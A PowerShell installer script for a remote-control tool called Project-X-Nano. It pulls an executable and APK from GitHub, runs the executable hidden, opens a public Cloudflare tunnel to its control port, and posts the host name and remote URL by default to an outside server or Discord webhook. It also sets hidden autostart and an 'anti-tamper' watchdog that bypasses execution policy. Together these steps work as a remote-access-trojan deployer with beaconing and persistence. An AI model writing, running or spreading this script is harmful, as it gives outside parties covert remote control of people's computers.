# =========================================================================
#  Project-X-Nano 1-Line Universal Automated Setup & Remote Cloud Hub
#  Downloads all files from GitHub, starts Cloudflare Tunnel automatically,
#  and uploads the remote access URL to your central server / webhook.
# =========================================================================

param(
    [string]$ReportUrl = $(if ($env:TUNNEL_REPORT_URL) { $env:TUNNEL_REPORT_URL } else { "https://project-x-alpha-lake.vercel.app/api/devices" }),
    [string]$CustomName = ""
)

$ErrorActionPreference = "SilentlyContinue"

Write-Host "========================================================" -ForegroundColor Cyan
Write-Host "      Project-X-Nano Automated Cloud Fleet Setup        " -ForegroundColor Cyan
Write-Host "========================================================" -ForegroundColor Cyan

# 1. Target Directory in User AppData
$InstallDir = "$env:LOCALAPPDATA\Project-X-Nano"
if (-not (Test-Path $InstallDir)) {
    New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
}

$ExePath = Join-Path $InstallDir "Project-X-Nano.exe"
$CfgPath = Join-Path $InstallDir "config.json"
$ApkPath = Join-Path $InstallDir "Project-X-Nano.apk"
$CloudflaredPath = Join-Path $InstallDir "cloudflared.exe"
$UrlFilePath = Join-Path $InstallDir "public_url.txt"

# 2. Terminate any previous instances
Write-Host "[*] Stopping previous instances..." -ForegroundColor Yellow
Stop-Process -Name Project-X-Nano, RemotePC, cloudflared -Force -ErrorAction SilentlyContinue

# 3. Download Project-X-Nano Core Executable from GitHub
Write-Host "[*] Downloading Project-X-Nano Master Executable from GitHub..." -ForegroundColor Green
$ExeUrl = "https://github.com/mexxz-01/Project-x-alpha/raw/main/dist/Project-X-Nano.exe"
curl.exe -L -s -o "$ExePath" "$ExeUrl"

if (-not (Test-Path "$ExePath") -or (Get-Item "$ExePath").Length -lt 100000) {
    Write-Host "[!] Primary executable download failed, trying mirror..." -ForegroundColor Yellow
    curl.exe -L -s -o "$ExePath" "https://raw.githubusercontent.com/mexxz-01/Project-x-alpha/main/dist/Project-X-Nano.exe"
}

# 4. Download and Configure config.json
Write-Host "[*] Downloading and configuring security settings..." -ForegroundColor Green
$CfgUrl = "https://raw.githubusercontent.com/mexxz-01/Project-x-alpha/main/config.json"
curl.exe -L -s -o "$CfgPath" "$CfgUrl"

# Inject report URL into config.json if provided
if ($ReportUrl) {
    try {
        $cfgJson = Get-Content "$CfgPath" -Raw | ConvertFrom-Json
        $cfgJson.tunnel_report_url = $ReportUrl
        $cfgJson.auto_forward = $true
        $cfgJson | ConvertTo-Json -Depth 10 | Set-Content "$CfgPath"
        Write-Host "[+] Webhook / Server report URL configured: $ReportUrl" -ForegroundColor Green
    } catch {}
}

# 5. Download Android Controller APK
Write-Host "[*] Downloading Android Controller APK..." -ForegroundColor Green
$ApkUrl = "https://github.com/mexxz-01/Project-x-alpha/raw/main/dist/Project-X-Nano.apk"
curl.exe -L -s -o "$ApkPath" "$ApkUrl"

# 6. Ensure Cloudflare Tunnel Binary (cloudflared.exe)
Write-Host "[*] Downloading official Cloudflare Tunnel engine..." -ForegroundColor Green
$CloudflaredUrl = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
if (-not (Test-Path "$CloudflaredPath") -or (Get-Item "$CloudflaredPath").Length -lt 10000000) {
    curl.exe -L -s -o "$CloudflaredPath" "$CloudflaredUrl"
}

# 7. Configure Windows Firewall
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if ($isAdmin) {
    netsh advfirewall firewall add rule name="Project-X-Nano" dir=in action=allow protocol=TCP localport=8765 >$null 2>&1
    Write-Host "[+] Firewall port 8765 opened for LAN access." -ForegroundColor Green
}

# 8. Start Project-X-Nano Host Server in Background
Write-Host "[*] Starting Project-X-Nano in background..." -ForegroundColor Green
Start-Process -FilePath "$ExePath" -WorkingDirectory "$InstallDir" -WindowStyle Hidden
Start-Sleep -Seconds 3

# 9. Start Cloudflare Tunnel and Capture Public Remote URL
Write-Host "[*] Starting Cloudflare Tunnel and generating secure public URL..." -ForegroundColor Cyan

# Terminate previous tunnel processes to avoid port or connection conflicts
Stop-Process -Name cloudflared -Force -ErrorAction SilentlyContinue

$tunnelLog = Join-Path $InstallDir "tunnel.log"
if (Test-Path $tunnelLog) { Remove-Item $tunnelLog -Force }

# Launch cloudflared with both stdout and stderr redirected into tunnel.log
$cloudflaredCmd = "`"$CloudflaredPath`" tunnel --url http://127.0.0.1:8765 > `"$tunnelLog`" 2>&1"
Start-Process -FilePath "cmd.exe" -ArgumentList "/c $cloudflaredCmd" -WindowStyle Hidden

# Wait up to 45 seconds for the trycloudflare.com URL with live progress
$publicUrl = ""
$startTime = Get-Date
Write-Host -NoNewline "[*] Connecting to Cloudflare edge network"
while (((Get-Date) - $startTime).TotalSeconds -lt 45) {
    Write-Host -NoNewline "."
    if (Test-Path $tunnelLog) {
        $logContent = Get-Content $tunnelLog -Raw -ErrorAction SilentlyContinue
        if ($logContent -match 'https://[a-zA-Z0-9-]+\.trycloudflare\.com') {
            $publicUrl = $matches[0]
            break
        }
    }
    Start-Sleep -Seconds 1
}
Write-Host ""

if ($publicUrl) {
    Write-Host ""
    Write-Host "========================================================" -ForegroundColor Green
    Write-Host " >> PUBLIC REMOTE CONTROL URL READY:                    " -ForegroundColor Green
    Write-Host "    $publicUrl" -ForegroundColor Yellow
    Write-Host "========================================================" -ForegroundColor Green
    Write-Host ""
    
    # Save URL to file
    Set-Content -Path $UrlFilePath -Value $publicUrl -Force
    
    # Update config.json with current public URL
    try {
        $cfgJson = Get-Content "$CfgPath" -Raw | ConvertFrom-Json
        $cfgJson.last_public_url = $publicUrl
        $cfgJson | ConvertTo-Json -Depth 10 | Set-Content "$CfgPath"
    } catch {}

    # 10. Upload public link to target server / webhook
    $targetWebhook = $ReportUrl
    if (-not $targetWebhook) {
        try {
            $cfgJson = Get-Content "$CfgPath" -Raw | ConvertFrom-Json
            $targetWebhook = $cfgJson.tunnel_report_url
        } catch {}
    }

    if ($targetWebhook) {
        Write-Host "[*] Uploading remote link to server/webhook: $targetWebhook" -ForegroundColor Cyan
        try {
            $computer = $env:COMPUTERNAME
            if ($targetWebhook -match "discord\.com") {
                $msg = "[Project-X-Nano Online] Host: " + $computer + " | Remote URL: " + $publicUrl
                $bodyObj = @{ content = $msg }
                $body = $bodyObj | ConvertTo-Json
            } else {
                $deviceId = ($computer.ToLower() -replace '[^a-z0-9_-]', '-')
                $bodyObj = @{
                    id = $deviceId
                    name = $computer
                    host = $computer
                    host_url = $publicUrl
                    tunnel_url = $publicUrl
                    public_url = $publicUrl
                    os = "Windows 11/10"
                    timestamp = [DateTimeOffset]::Now.ToUnixTimeSeconds()
                }
                $body = $bodyObj | ConvertTo-Json
            }
            Invoke-RestMethod -Uri $targetWebhook -Method Post -Body $body -ContentType "application/json" -TimeoutSec 10 | Out-Null
            Write-Host "[+] Link successfully uploaded to server!" -ForegroundColor Green
        } catch {
            Write-Host "[!] Note: Could not report URL to server: $_" -ForegroundColor Yellow
        }
    } else {
        Write-Host "[i] Tip: Pass -ReportUrl '<webhook>' to automatically upload your URL to Discord or server." -ForegroundColor Gray
    }
} else {
    Write-Host "[!] Cloudflare Tunnel URL timed out. Local network access is still active." -ForegroundColor Yellow
}

# 11. Configure Watchdog & Integrity Guard
Write-Host "[*] Configuring Watchdog and Anti-Tamper Service..." -ForegroundColor Green
$WatchdogPath = Join-Path $InstallDir "watchdog.ps1"
$LocalWatchdog = Join-Path $PSScriptRoot "watchdog.ps1"
if (Test-Path $LocalWatchdog) {
    Copy-Item "$LocalWatchdog" "$WatchdogPath" -Force
} else {
    curl.exe -L -s -o "$WatchdogPath" "https://raw.githubusercontent.com/mexxz-01/Project-x-alpha/main/watchdog.ps1"
}

# Copy or download uninstaller
$UninstallPath = Join-Path $InstallDir "uninstall.bat"
$LocalUninstall = Join-Path $PSScriptRoot "uninstall.bat"
if (Test-Path $LocalUninstall) {
    Copy-Item "$LocalUninstall" "$UninstallPath" -Force
}

# 12. Configure Windows Autostart (starts on PC reboot with tunnel & watchdog)
$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
try {
    Set-ItemProperty -Path $runKey -Name "Project-X-Nano" -Value "`"$ExePath`" --forward" -Force | Out-Null
    Set-ItemProperty -Path $runKey -Name "Project-X-Nano-Watchdog" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$WatchdogPath`"" -Force | Out-Null
    Write-Host "[*] Configured Windows Autostart for Project-X-Nano and Watchdog." -ForegroundColor Green
} catch {}

# Start Watchdog immediately
Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$WatchdogPath`"" -WindowStyle Hidden

# 13. Local IP detection
$ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias 'Wi-Fi*','Ethernet*' -ErrorAction SilentlyContinue | Where-Object { $_.IPAddress -notlike "169.254*" } | Select-Object -First 1).IPAddress
if (-not $ip) { $ip = "127.0.0.1" }

Write-Host "========================================================" -ForegroundColor Cyan
Write-Host " [SUCCESS] Project-X-Nano is installed and running!     " -ForegroundColor Green
Write-Host "========================================================" -ForegroundColor Cyan
Write-Host " Local Web URL:    http://localhost:8765" -ForegroundColor Yellow
Write-Host " Network URL:      http://$($ip):8765" -ForegroundColor Yellow
if ($publicUrl) {
    Write-Host " Public URL:       $publicUrl" -ForegroundColor Green
}
Write-Host " Android APK:      http://$($ip):8765/download/apk" -ForegroundColor Yellow
Write-Host " Install Folder:   $InstallDir" -ForegroundColor Gray
Write-Host "========================================================" -ForegroundColor Cyan

Write-Host ""
$openChoice = Read-Host "[?] Do you want to open the dashboard now? (Y/N)"
if ($openChoice -match "^[Yy]") {
    $targetUrl = if ($publicUrl) { $publicUrl } else { "http://localhost:8765" }
    Write-Host "[*] Opening dashboard at $targetUrl..." -ForegroundColor Green
    Start-Process $targetUrl
} else {
    Write-Host "[*] Dashboard launch skipped. Background agent is fully active." -ForegroundColor Cyan
}
